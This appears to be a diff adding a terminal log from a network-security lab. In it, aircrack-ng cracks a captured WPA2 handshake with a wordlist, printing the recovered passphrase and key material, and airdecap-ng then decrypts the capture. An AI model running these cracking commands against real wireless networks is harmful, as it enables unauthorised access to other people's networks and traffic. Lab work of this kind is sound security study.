@@ -1,0 +1,35 @@
+
+cs@cs-VirtualBox:~$ aircrack-ng -w GDict_v2.txt -b 00:0f:c9:0c:f7:93 handshake.cap
+Opening handshake.cap
+Reading packets, please wait...
+
+			                                 Aircrack-ng 1.2 beta3
+
+
+			                   [00:00:02] 10548 keys tested (4155.81 k/s)
+
+
+			                           KEY FOUND! [ <OC@(OL4 ]
+
+
+			      Master Key     : A2 3E 89 CC EF EC 87 9A BF AC 4D 39 C2 80 31 C4 
+			                       BA 90 75 29 06 E4 D3 C7 19 C5 BD A1 32 8A 42 FE 
+
+			      Transient Key  : A3 CA 24 30 C0 54 2D 08 02 F9 CA 20 A7 DB 67 62 
+			                       22 3F B3 03 C1 EA FC 95 FE 10 C3 EB D2 EF 13 E9 
+			                       AA C4 FD 70 A1 29 D8 68 4C 04 FD 40 4B 47 B1 22 
+			                       3C C6 DB A8 98 CD 18 D5 8C D1 F3 76 64 39 DB 61 
+
+			      EAPOL HMAC     : 9F 32 CA 85 04 F8 71 A1 B6 FA D2 87 FF 68 B1 69
+
+cs@cs-VirtualBox:~$ airdecap-ng -e 'netsec-wpa' -p '<OC@(OL4' handshake.cap
+			
+				Total number of packets read            99
+				Total number of WEP data packets         0
+				Total number of WPA data packets         5
+				Number of plaintext data packets         0
+				Number of decrypted WEP  packets         0
+				Number of corrupted WEP  packets         0
+				Number of decrypted WPA  packets         1 
+
+WPA2 passphrase: <OC@(OL4	 
